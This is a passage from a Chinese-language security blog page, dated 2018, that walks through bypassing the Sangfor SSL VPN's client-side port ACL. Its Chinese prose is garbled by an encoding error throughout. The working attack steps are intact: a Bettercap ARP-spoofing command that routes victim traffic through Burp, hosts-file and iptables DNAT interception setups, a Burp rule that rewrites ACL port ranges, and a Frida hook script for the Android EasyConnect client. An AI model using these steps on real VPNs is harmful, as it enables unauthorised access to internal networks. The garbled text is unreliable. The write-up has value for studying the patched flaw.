<!DOCTYPE html>
<html lang="zh"><meta charset="utf-8"><meta name="generator" content="Hugo 0.154.5"><meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
<meta name="color-scheme" content="light dark">
<meta name="supported-color-schemes" content="light dark"><meta name="description" content="å‰è¨€
é¦–å…ˆå£°æ˜æ­¤æ¼æ´å¾ˆè€ï¼Œä¿®å¤çš„è¯åªéœ€å‡çº§åˆ°M7.5ç‰ˆæœ¬ï¼Œå‰æ®µæ—¶é—´æ— æ„é—´çœ‹åˆ°å®‰å…¨ç¾¤æœ‰äººèŠåˆ°ç»•æ·±ä¿¡æœSSL VPNçš„ACLï¼Œä¸€ç›´æƒ³å®è·µä¸€ä¸‹ï¼Œåæ¥å†ç½‘ä¸Šåªæ‰¾åˆ°äº†è¿™ä¸€ç¯‡ä¸¤å¹´å‰çš„å‚è€ƒèµ„æ–™çœ‹æˆ‘å¦‚ä½•åˆ©ç”¨burpå¤§æ³•ç»•è¿‡æ·±ä¿¡æœSSL VPNè®¿é—®æƒé™æ§åˆ¶ï¼Œå¹¶ä¸”è¿™ä¸ªäººçš„é©¬èµ›å…‹éå¸¸å¯æ€•ï¼Œå¯¼è‡´å‡ ä¹ä¿¡æ¯é‡å¤ªå°‘ï¼Œçœ‹ä¸æ‡‚ä»–åœ¨è¯´ä»€ä¹ˆã€‚"><title>æ·±ä¿¡æœ SSL VPN ç«¯å£ACL ç»•è¿‡å®è·µ&nbsp;&ndash;&nbsp;Gorgias&#39; Blog</title><link rel="stylesheet" href="/css/core.min.363cdd0e3e6340dd0e88b1f21887fb7e53e3129ed31d7f3cf62686d06069621ece79dc5ffb48a77ebba54468e667212f.css" integrity="sha384-NjzdDj5jQN0OiLHyGIf7flPjEp7THX889iaG0GBpYh7Oedxf&#43;0infrulRGjmZyEv"><meta name="twitter:card" content="summary" />
<meta name="twitter:title" content="æ·±ä¿¡æœ SSL VPN ç«¯å£ACL ç»•è¿‡å®è·µ" /><body><section id="header">
    <div class="header wrap"><span class="header left-side"><a class="site home" href="/zh/"><span class="site name">Gorgias' Blog</span></a></span>
        <span class="header right-side"><div class="nav wrap"><nav class="nav"><a class="nav item" href="/zh/categories/">åˆ†ç±»</a><a class="nav item" href="/zh/tags/">æ ‡ç­¾</a><a class="nav item" href="/zh/about/">å…³äº</a><a class="nav item" href="/zh/links/">å‹é“¾</a><a class="nav item" href="/en/posts/sangfor-ssl-vpn-port-acl-bypass/" title="English">
            <span class="lang-icon">ğŸŒ</span>English</a></nav></div></span></div></section><section id="content"><style>
     
    .toc-wrapper {
        position: fixed;
        bottom: 30px;
        right: 30px;
        z-index: 9999;
        display: flex;
        flex-direction: column-reverse;
        align-items: flex-end;
        gap: 10px;
    }

     
    .toc-button {
        background-color: #fff;
        color: #333;
        width: 50px;
        height: 50px;
        border-radius: 50%;
        box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
        display: flex;
        align-items: center;
        justify-content: center;
        cursor: pointer;
        border: 1px solid #ddd;
        transition: transform 0.2s, box-shadow 0.2s;
    }

    .toc-button:hover {
        transform: translateY(-2px);
        box-shadow: 0 6px 16px rgba(0, 0, 0, 0.2);
    }

    .toc-button svg {
        width: 24px;
        height: 24px;
        fill: currentColor;
    }

     
    .toc-content-box {
        background: #fff;
        border: 1px solid #eee;
        border-radius: 8px;
        padding: 15px;
        width: 250px;
        max-height: 60vh;
        overflow-y: auto;
        box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1);
        display: none;
         
        font-size: 0.9em;
        opacity: 0;
        transform: translateY(10px);
        transition: opacity 0.3s, transform 0.3s;
    }

    .toc-content-box.show {
        display: block;
        opacity: 1;
        transform: translateY(0);
    }

    .toc-header {
        font-weight: bold;
        border-bottom: 2px solid #f0f0f0;
        padding-bottom: 8px;
        margin-bottom: 8px;
        font-size: 1.1em;
    }

     
    #TableOfContents {
        text-align: left;
    }

    #TableOfContents ul,
    #TableOfContents ol {
        list-style: none;
        padding-left: 0;
        margin: 0;
    }

    #TableOfContents li {
        margin: 4px 0;
    }

    #TableOfContents ul ul,
    #TableOfContents ol ol {
        padding-left: 1em;
    }

    #TableOfContents a {
        text-decoration: none;
        color: #555;
        display: block;
        padding: 2px 0;
        transition: color 0.2s;
    }

    #TableOfContents a:hover {
        color: #007bff;
    }

     
    @media (prefers-color-scheme: dark) {
        .toc-button {
            background-color: #333;
            color: #ddd;
            border-color: #555;
        }

        .toc-content-box {
            background-color: #2a2a2a;
            border-color: #444;
            color: #ddd;
        }

        .toc-header {
            border-bottom-color: #444;
        }

        #TableOfContents a {
            color: #aaa;
        }

        #TableOfContents a:hover {
            color: #fff;
        }
    }
</style><div class="article-container"><section class="article header">
    <h1 class="article title">æ·±ä¿¡æœ SSL VPN ç«¯å£ACL ç»•è¿‡å®è·µ</h1><p class="article date">2018-03-24<span class="langs"><span class="lang">
                    <a href="/en/posts/sangfor-ssl-vpn-port-acl-bypass/" title="English">
                        <span class="lang-icon">ğŸŒ</span>English</a>
                </span></span></p></section><article class="article markdown-body"><h2 id="å‰è¨€">å‰è¨€</h2>
<p>é¦–å…ˆå£°æ˜æ­¤æ¼æ´å¾ˆè€ï¼Œä¿®å¤çš„è¯åªéœ€å‡çº§åˆ°M7.5ç‰ˆæœ¬ï¼Œå‰æ®µæ—¶é—´æ— æ„é—´çœ‹åˆ°å®‰å…¨ç¾¤æœ‰äººèŠåˆ°ç»•æ·±ä¿¡æœSSL VPNçš„ACLï¼Œä¸€ç›´æƒ³å®è·µä¸€ä¸‹ï¼Œåæ¥å†ç½‘ä¸Šåªæ‰¾åˆ°äº†è¿™ä¸€ç¯‡ä¸¤å¹´å‰çš„å‚è€ƒèµ„æ–™<a href="https://www.secpulse.com/archives/50144.html"target="_blank" rel="noopener noreferrer">çœ‹æˆ‘å¦‚ä½•åˆ©ç”¨burpå¤§æ³•ç»•è¿‡æ·±ä¿¡æœSSL VPNè®¿é—®æƒé™æ§åˆ¶</a>ï¼Œå¹¶ä¸”è¿™ä¸ªäººçš„é©¬èµ›å…‹éå¸¸å¯æ€•ï¼Œå¯¼è‡´å‡ ä¹ä¿¡æ¯é‡å¤ªå°‘ï¼Œçœ‹ä¸æ‡‚ä»–åœ¨è¯´ä»€ä¹ˆã€‚</p>
<p>äºæ˜¯æˆ‘èŠ±æ—¶é—´ç ”ç©¶äº†ä¸€ä¸‹ï¼Œå…¶å®æ²¡æœ‰ä»–è¯´çš„é‚£ä¹ˆå¤æ‚ï¼Œå°±æ˜¯ä¸­é—´äººæ”»å‡»ï¼šæœåŠ¡ç«¯è¿”å›ACLåˆ—è¡¨ä¹‹åï¼Œæ›¿æ¢ç«¯å£èŒƒå›´ï¼Œå®¢æˆ·ç«¯å¯¹ç«¯å£è¿›è¡Œè®¿é—®æ§åˆ¶ï¼ŒæœåŠ¡ç«¯å¯¹IPè®¿é—®æ§åˆ¶ã€‚
è¿™ä¸ªæ¼æ´æäº¤è€…æå‡ºäº†èƒ½å¦ç»•IPçš„é—®é¢˜ï¼Œä½†æ˜¯è¿™éƒ¨åˆ†æ²¡éªŒè¯ä¹Ÿæ²¡æœ‰è§£é‡Šï¼Œè¯„è®ºéƒ½æ˜¯ä¸€ç‰‡è†œæ‹œï¼Œå¯¼è‡´æˆ‘ä»¥ä¸ºèƒ½ç»•IPè®¿é—®æ§åˆ¶ã€‚</p>
<p>è¿˜å¯ä»¥Hookå®¢æˆ·ç«¯æ¥ç»•è¿‡ç«¯å£çš„è®¿é—®æ§åˆ¶ï¼Œä¸è¿‡è¿™æ ·ä¹ŸæŒºéº»çƒ¦ã€‚è™½ç„¶æ˜¯å¾ˆç®€å•çš„ä¸œè¥¿ï¼Œä½†æ˜¯é€šè¿‡å®è·µï¼Œå­¦åˆ°äº†ä¸€äº›æŠ€å·§ï¼Œè®°å½•ä¸‹æ¥ã€‚</p>
<h2 id="ç½‘ç»œå±‚">ç½‘ç»œå±‚</h2>
<p>æˆ‘å°è¯•äº†ä¸‰ä¸ªæ–¹æ³•ï¼Œéƒ½éœ€è¦ç”¨åˆ°BurpSuiteã€‚æ—¢ç„¶å±äºä¸­é—´äººæ”»å‡»ï¼Œé‚£ä¹ˆBurpå°±è¦å¼€å¯é€æ˜ä»£ç†äº†ã€‚</p>
<p><img loading="lazy"  src="invisible_proxying.png"
        alt="invisible_proxying"/></p>
<h3 id="æ–¹æ³•1bettercap">æ–¹æ³•1ï¼šBettercap</h3>
<p>Bettercapæ˜¯å®æˆ˜ç”¨çš„ä¸­é—´äººæ”»å‡»å·¥å…·ï¼Œä½†æ˜¯åœ¨ç™½ç›’å®è·µä¸­æœ€ä¸ç¨³å®šã€‚</p>
<ul>
<li>å®¢æˆ·ç«¯ä¸»æœº Sangfor SSL VPN</li>
<li>ä¸­é—´äººä¸»æœº Bettercap + Burp Suite</li>
</ul>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">bettercap -I ens38 -G 192.168.1.1 -T target_ip -S ARP --custom-proxy burp_suite_ip --custom-proxy-port <span class="m">8080</span>
</span></span></code></pre></div><p>é¦–å…ˆVPNæœåŠ¡å™¨ç«¯å£æ˜¯443ï¼Œå› æ­¤éœ€è¦æŠŠç«¯å£443é‡å®šå‘åˆ°Burpçš„8080ï¼Œå½“ç„¶ä½¿ç”¨rootæƒé™è¿è¡ŒBurpå¯ä»¥ç›‘å¬443ç«¯å£ï¼Œè¿™æ ·å°±ä¸ç”¨é‡å®šå‘ç«¯å£äº†ã€‚</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo bettercap -I ens38 -G 192.168.1.1 -T target_ip -S ARP --custom-proxy burp_suite_ip --custom-proxy-port <span class="m">8080</span> --custom-https-proxy burp_suite_ip --custom-https-proxy-port <span class="m">8080</span> --custom-redirection <span class="s2">&#34;TCP 443 8080&#34;</span>
</span></span></code></pre></div><p><img loading="lazy"  src="bettercap.png"
        alt="bettercap"/></p>
<h3 id="æ–¹æ³•2hosts">æ–¹æ³•2ï¼šhosts</h3>
<p>ç¯å¢ƒå¦‚ä¸‹:</p>
<ul>
<li>å®¢æˆ·ç«¯ä¸»æœº Sangfor SSL VPN</li>
<li>ä¸­é—´äººä¸»æœº Bettercap + Burp Suite</li>
</ul>
<p>ä¹Ÿå¯ä»¥ç›´æ¥ä¿®æ”¹hostsï¼Œä½†æ˜¯Burpçš„ç›‘å¬ç«¯å£è¦ä¸VPNç«¯å£ä¸€è‡´ã€‚</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s2">&#34;target_ip vpn.test.com&#34;</span> &gt;&gt; /etc/hosts
</span></span></code></pre></div><h3 id="æ–¹æ³•3destnation-nat">æ–¹æ³•3ï¼šDestnation NAT</h3>
<p>è¿™ç§æ–¹æ³•æœ€ç¨³å®šï¼Œåº”ç”¨åœºæ™¯å¾ˆå¤šï¼Œè€Œä¸”é€‚ç”¨äºå®¢æˆ·ç«¯ä¸»æœºæ— æ³•ä½¿ç”¨æœ¬åœ°ä»£ç†çš„åœºæ™¯ï¼š</p>
<ol>
<li>å®¢æˆ·ç«¯æ£€æµ‹å¹¶ä¸å…è®¸ç³»ç»Ÿä»£ç†ã€‚</li>
<li>å®‰å“ä½¿ç”¨VPNä¹‹åï¼Œæ— çº¿ç½‘ç»œè®¾ç½®çš„ä»£ç†å°†ä¼šå¤±æ•ˆã€‚</li>
</ol>
<p>é¦–å…ˆæ·±ä¿¡æœVPNåœ¨Linuxå…¼å®¹æ€§å¾ˆå·®ï¼Œæ‰€ä»¥åªèƒ½åœ¨Winä¸Šæˆ–è€…ç§»åŠ¨ç«¯è¿è¡Œã€‚å› æ­¤æœ€å¥½ç½‘å…³å’Œå®¢æˆ·ç«¯ä¸»æœºåˆ†å¼€ï¼Œç¯å¢ƒå¦‚ä¸‹:</p>
<ul>
<li>å®¢æˆ·ç«¯ä¸»æœº è£…æœ‰Sangfor SSL VPN</li>
<li>ä¸­é—´äººä¸»æœº Burp Suite</li>
<li>ä¸­é—´äººç½‘å…³æœº iptables</li>
</ul>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># å¼€å¯IPv4å†…æ ¸è½¬å‘</span>
</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="m">1</span> &gt; /proc/sys/net/ipv4/ip_forward
</span></span><span class="line"><span class="cl">iptables -F
</span></span><span class="line"><span class="cl">iptables -X
</span></span><span class="line"><span class="cl">iptables -t nat -F
</span></span><span class="line"><span class="cl">iptables -t nat -X
</span></span><span class="line"><span class="cl">iptables -t mangle -F
</span></span><span class="line"><span class="cl">iptables -t mangle -X
</span></span><span class="line"><span class="cl">iptables -t raw -F
</span></span><span class="line"><span class="cl">iptables -t raw -X
</span></span><span class="line"><span class="cl">iptables -t security -F
</span></span><span class="line"><span class="cl">iptables -t security -X
</span></span><span class="line"><span class="cl">iptables -P INPUT ACCEPT
</span></span><span class="line"><span class="cl">iptables -P FORWARD ACCEPT
</span></span><span class="line"><span class="cl">iptables -P OUTPUT ACCEPT
</span></span><span class="line"><span class="cl"><span class="c1"># å‡è®¾å®¢æˆ·ç«¯ä¸»æœºç½‘æ®µæ˜¯192.168.1.0/24ï¼Œå®¢æˆ·ç«¯ä¸»æœºé€šè¿‡ä¸­é—´äººç½‘å…³æœºçš„eth0ä¸Šç½‘</span>
</span></span><span class="line"><span class="cl">iptables -t nat -A POSTROUTING -s 192.168.1.0/24 -o eth0 -j MASQUERADE
</span></span><span class="line"><span class="cl"><span class="c1"># å½“è®¿é—®VPNæœåŠ¡å™¨çš„åœ°å€vpn_server_ip:443æ—¶ï¼Œç›®æ ‡åœ°å€è½¬æ¢æˆburp_suite_ip:8080</span>
</span></span><span class="line"><span class="cl">iptables -t nat -A PREROUTING -d vpn_server_ip -p tcp --dport <span class="m">443</span> -j DNAT --to-destination burp_suite_ip.:8080
</span></span></code></pre></div><h3 id="åç»­æ“ä½œ">åç»­æ“ä½œ</h3>
<p>é¦–å…ˆï¼Œè®¾ç½®Burpçš„æ›¿æ¢è§„åˆ™ã€‚
<img loading="lazy"  src="replace_rule.png"
        alt="replace_rule"/></p>
<p>å…¶æ¬¡ï¼Œå¼€å§‹ç™»å½•VPNã€‚</p>
<p><img loading="lazy"  src="target_request.png"
        alt="target_request"/></p>
<p>å½“/por/rclist.cspè¯·æ±‚å®Œæ¯•ï¼Œé©¬ä¸Šå–æ¶ˆBurpä»£ç†ï¼Œå¦åˆ™ä¼šå¯¼è‡´è®¿é—®å¤ªæ…¢VPNæ–­å¼€ï¼Œå–æ¶ˆBurpä»£ç†ä¾ç„¶èƒ½å¤Ÿä¿æŒç½‘ç»œé“¾æ¥ã€‚
è¿™ä¸€ç‚¹ä¸Šæ–¹æ³•3æœ€æ–¹ä¾¿ï¼Œä¸éœ€è¦åœ¨å®¢æˆ·ç«¯ä¸»æœºæ“ä½œï¼Œæ–¹æ³•2æ¯”è¾ƒéº»çƒ¦ï¼Œæ–¹æ³•1å¾ˆå¤§å¯èƒ½æœ‰å»¶è¿Ÿã€‚</p>
<p><img loading="lazy"  src="DNAT.png"
        alt="DNAT"/></p>
<p>è¿™æ—¶å€™å®¢æˆ·ç«¯æ¥æ”¶åˆ°çš„ACLè¡¨çš„ç«¯å£èŒƒå›´å·²ç»è¢«ç¯¡æ”¹ã€‚</p>
<p><img loading="lazy"  src="malicious_acl.png"
        alt="malicious_acl"/></p>
<p>é¦–å…ˆæŸ¥çœ‹NATè¡¨çš„PREROUTINGé“¾å·ç æ˜¯1ã€‚</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">&gt; iptables -t nat -L --line-number
</span></span><span class="line"><span class="cl">Chain PREROUTING <span class="o">(</span>policy ACCEPT<span class="o">)</span>
</span></span><span class="line"><span class="cl">num  target     prot opt <span class="nb">source</span>               destination
</span></span><span class="line"><span class="cl"><span class="m">1</span>    DNAT       tcp  --  anywhere             vpn_server_ip         tcp dpt:https to:burp_suite_ip:8080
</span></span></code></pre></div><p>å°†å…¶åˆ å»ï¼Œå°±èƒ½ç»•è¿‡å®¢æˆ·ç«¯çš„ç«¯å£ACLäº†ã€‚</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">iptables -t nat -D PREROUTING <span class="m">1</span>
</span></span></code></pre></div><h2 id="åº”ç”¨å±‚">åº”ç”¨å±‚</h2>
<p>è¿™é‡Œåªå®è·µå®‰å“å¹³å°çš„ï¼Œæ²¡æœ‰åŠ å›ºï¼Œæ¯”è¾ƒæ–¹ä¾¿ã€‚
é¦–å…ˆç”¨jadxæ‰“å¼€easyconnectï¼Œç„¶åæ‰¾åˆ°&quot;rclist.csp&quot;çš„å…³é”®å­—ã€‚
<img loading="lazy"  src="keywords.png"
        alt="keywords"/></p>
<p>ä¸€è·¯è·Ÿè¿‡å»ï¼Œæ‰¾åˆ°é€‚åˆHookæœåŠ¡ç«¯è¿”å›ç»“æœçš„ä½ç½®ã€‚
<img loading="lazy"  src="code1.png"
        alt="code1"/>
<img loading="lazy"  src="code2.png"
        alt="code2"/></p>
<p>ç„¶åç¼–å†™Hookè„šæœ¬ï¼ŒæŠŠç«¯å£èŒƒå›´è®¾ç½®æˆæœ€å¤§ï¼Œä¿å­˜ä¸º2.jsã€‚</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">hookIt</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="kd">var</span> <span class="nx">rclist</span><span class="o">=</span><span class="nx">Java</span><span class="p">.</span><span class="nx">use</span><span class="p">(</span><span class="s2">&#34;com.sangfor.vpn.client.service.d.a&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nx">rclist</span><span class="p">.</span><span class="nx">a</span><span class="p">.</span><span class="nx">overload</span><span class="p">(</span><span class="s1">&#39;java.lang.String&#39;</span><span class="p">).</span><span class="nx">implementation</span><span class="o">=</span><span class="nx">replacePorts</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">replacePorts</span><span class="p">(</span><span class="nx">str</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">str</span> <span class="o">=</span> <span class="nx">str</span><span class="p">.</span><span class="nx">replace</span><span class="p">(</span><span class="sr">/port=&#34;[^\&#34;]+&#34;/g</span><span class="p">,</span> <span class="s1">&#39;port=&#34;1~65535&#34;&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s2">&#34;str replaced: &#34;</span> <span class="o">+</span> <span class="nx">str</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="kd">var</span> <span class="nx">result</span> <span class="o">=</span> <span class="k">this</span><span class="p">.</span><span class="nx">a</span><span class="p">(</span><span class="nx">str</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nx">result</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nx">Java</span><span class="p">.</span><span class="nx">perform</span><span class="p">(</span><span class="nx">hookIt</span><span class="p">);</span>
</span></span></code></pre></div><p>æˆ‘çš„å®‰å“è®¾å¤‡æ˜¯64ä½çš„ï¼Œæœ‰rootæƒé™ï¼Œé€šè¿‡adbå¼€å¯FridaæœåŠ¡</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">adb push frida-server-10.7.6-android-arm64 /data/local/tmp/
</span></span><span class="line"><span class="cl">adb shell chmod <span class="m">755</span> /data/local/tmp/frida-server-10.7.6-android-arm64
</span></span><span class="line"><span class="cl">adb shell su -c /data/local/tmp/frida-server-10.7.6-android-arm64
</span></span></code></pre></div><p>ä½¿ç”¨frida-psæ‰¾åˆ°Easyconnectçš„è¿›ç¨‹å</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">frida-ps -aU <span class="p">|</span> grep sangfor
</span></span></code></pre></div><p><img loading="lazy"  src="ps.png"
        alt="ps"/></p>
<p>è¿è¡ŒFridaï¼Œåˆ¶å®šHookè„šæœ¬å’Œè¿›ç¨‹å</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">frida -U -l 2.js com.sangfor.vpn.client.phone
</span></span></code></pre></div><p><img loading="lazy"  src="frida.png"
        alt="frida"/></p>
<p>å¯ä»¥çœ‹åˆ°ç«¯å£èŒƒå›´å·²ç»è¢«ä¿®æ”¹ã€‚</p>
<p>ä»¥ä¸Šæ­¥éª¤åœ¨å®æˆ˜ä¸­éƒ½å¾ˆç¹çï¼Œå…¶å®å¯ä»¥é€šè¿‡æ·±ä¿¡æœSSL VPNçš„SDKæ¥å¼€å‘ä¸€ä¸ªæ— é™åˆ¶ç‰ˆï¼Œä¸è¿‡ä¹Ÿå¤ªéº»çƒ¦äº†ï¼Œåªæ˜¯ç»•ä¸ªç«¯å£è€Œå·²ï¼Œè¿˜ä¸å»å¤šæ’¸å‡ å°æœåŠ¡å™¨ç›´æ¥æ‰“å…¥å†…ç½‘ã€‚</p>
<h2 id="reference">Reference</h2>
<p><a href="https://www.frida.re/docs/home/"target="_blank" rel="noopener noreferrer">Frida Docs</a></p>
<p><a href="https://linux.die.net/man/8/iptables"target="_blank" rel="noopener noreferrer">iptables</a></p>
<p><a href="https://www.bettercap.org/"target="_blank" rel="noopener noreferrer">Bettercap</a></p>
</article><section class="article labels"><a class="category" href=/zh/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/>ç½‘ç»œå®‰å…¨</a><a class="tag" href=/zh/tags/%E6%B7%B1%E4%BF%A1%E6%9C%8D/>æ·±ä¿¡æœ</a><a class="tag" href=/zh/tags/sslvpn/>SSLVPN</a></section>
</div>

<div class="article bottom"><section class="article navigation"><p><a class="link" href="/zh/posts/linux-post-exploitation-pam-backdoor-notes/"><span class="iconfont icon-article"></span>Linux åæ¸—é€ç¬”è®° PAMåé—¨</a></p><p><a class="link" href="/zh/posts/esim-notes/"><span class="iconfont icon-article"></span>eSIMå­¦ä¹ ç¬”è®°</a></p></section></div></section><section id="footer"><div class="footer-wrap">
    <p class="copyright">2015 - 2026 Gorgias' Blog. </p><p class="license">
        <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank" rel="noopener noreferrer">
            <img alt="CC BY-NC-SA" loading="lazy" src="/images/by-nc.svg" style="vertical-align: middle; height: 1.2em; margin: 0 0.2em;" />
            CC BY-NC-SA 4.0
        </a>
        (ç½²å-éå•†ä¸šæ€§ä½¿ç”¨-ç›¸åŒæ–¹å¼å…±äº«).
    </p><p class="powerby"><span>Powered&nbsp;by&nbsp;</span><a href="https://gohugo.io" 
        target="_blank" rel="noopener noreferrer">Hugo</a><span>&nbsp;&amp;&nbsp;</span><a href="https://themes.gohugo.io/hugo-notepadium/" 
        target="_blank" rel="noopener noreferrer">Notepadium</a></p></div></section></body>

</html>